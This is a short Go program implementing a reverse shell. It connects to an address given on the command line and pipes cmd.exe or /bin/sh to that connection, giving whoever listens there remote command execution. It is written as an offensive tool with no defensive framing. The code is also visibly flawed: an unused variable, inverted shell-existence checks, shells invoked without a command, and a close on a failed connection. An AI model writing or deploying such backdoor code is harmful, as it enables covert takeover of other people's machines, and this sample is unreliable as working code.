package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	target := flag.String("t", "", "ip:port")
	flag.Parse()
	//target := *args_target
	revTCP(*target)

}

// target format "127.0.0.0:9000"
func revTCP(target string) {

	connection, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Error : ", err.Error())
		connection.Close()
	}
	getPrompt(connection)
}

func getPrompt(shell net.Conn) {
	CMD_PATH := "C:\\Windows\\System32\\cmd.exe"
	BASH_PATH := "/bin/sh"
	input := bufio.NewReader(shell)
	if _, err := os.Stat(CMD_PATH); err != nil {
		prompt := exec.Command(CMD_PATH, "/c")
		prompt.Stdin = shell
		prompt.Stdout = shell
		prompt.Stderr = shell
		prompt.Run()
	} else if _, err := os.Stat(BASH_PATH); err != nil {
		prompt := exec.Command(BASH_PATH, "-c")
		prompt.Stdin = shell
		prompt.Stdout = shell
		prompt.Stderr = shell
		prompt.Run()
	}
	shell.Close()

}
